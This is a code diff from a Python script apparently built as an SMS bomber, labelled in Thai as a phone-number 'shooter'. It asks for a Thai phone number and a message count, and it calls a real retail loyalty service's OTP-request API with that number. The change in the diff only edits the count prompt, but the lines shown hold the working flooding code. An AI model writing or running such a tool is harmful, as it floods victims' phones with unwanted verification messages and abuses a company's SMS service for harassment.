@@ -35,7 +35,7 @@ if old>=5:
 	print ("[ ยิงเบอร์ | API5 | V1.0 BY SAI XD]")
 	phone = input("\033[91m[+]เบอร์โทร :  🇹 🇭  66+ \033[91m") 
 	print ("setting")
-	jam = int(input("\033[91m[+] \033[91m")) 
+	jam = int(input("\033[91m[+]จำนวน : \033[91m")) 
 	print ("setting")
 	def api():
 		requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
